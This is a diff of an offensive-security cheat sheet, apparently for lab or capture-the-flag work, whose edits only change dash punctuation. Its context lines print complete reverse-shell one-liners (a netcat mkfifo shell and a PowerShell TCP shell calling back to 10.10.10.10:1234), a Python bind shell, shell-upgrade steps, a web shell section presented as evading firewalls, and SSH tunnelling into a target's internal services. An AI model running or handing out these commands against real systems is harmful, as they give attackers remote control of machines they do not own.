@@ -36,7 +36,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
 ```
 
 **PowerShell (Windows)**
-> Opens a TCP socket to your listener, then loops — reading commands from the stream, executing them with `iex`, and sending the output back. Essentially a manual interactive shell over raw TCP.
+> Opens a TCP socket to your listener, then loops  -  reading commands from the stream, executing them with `iex`, and sending the output back. Essentially a manual interactive shell over raw TCP.
 ```powershell
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
 ```
@@ -56,7 +56,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
 ```
 
 **Python**
-> Creates a TCP socket, binds it to port 1234 on all interfaces, waits for a connection, then loops — receiving commands, running them as subprocesses, and sending back the output.
+> Creates a TCP socket, binds it to port 1234 on all interfaces, waits for a connection, then loops  -  receiving commands, running them as subprocesses, and sending back the output.
 ```python
 python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
 ```
@@ -76,7 +76,7 @@ nc 10.10.10.1 1234
 
 ## TTY Upgrade
 
-Run this every time you catch a raw shell — gives you a proper interactive terminal.
+Run this every time you catch a raw shell  -  gives you a proper interactive terminal.
 
 ```bash
 # 1. On the remote shell
@@ -90,7 +90,7 @@ stty raw -echo
 fg
 # Hit enter twice if needed
 
-# 4. Fix terminal size — run these on your LOCAL machine first
+# 4. Fix terminal size  -  run these on your LOCAL machine first
 echo $TERM          # e.g. xterm-256color
 stty size           # e.g. 67 318
 
@@ -103,7 +103,7 @@ stty rows 67 columns 318
 
 ## Web Shell
 
-Runs on the target web server. Communicates over HTTP — bypasses firewall rules and survives reboots.
+Runs on the target web server. Communicates over HTTP  -  bypasses firewall rules and survives reboots.
 
 ### One-liners
 
@@ -162,10 +162,10 @@ ssh -L <local_port>:127.0.0.1:<remote_port> <user>@<target>
 ssh -L 8765:127.0.0.1:8765 -L 7999:127.0.0.1:7999 <user>@<target>
 ```
 
-After running, connect to `127.0.0.1:<local_port>` on your machine — traffic is tunnelled through SSH to the target's internal service.
+After running, connect to `127.0.0.1:<local_port>` on your machine  -  traffic is tunnelled through SSH to the target's internal service.
 
 ```bash
-# Example — access internal web app on target port 8080
+# Example  -  access internal web app on target port 8080
 ssh -L 8080:127.0.0.1:8080 user@10.129.1.1
 # Then browse to http://127.0.0.1:8080 on your machine
 ```
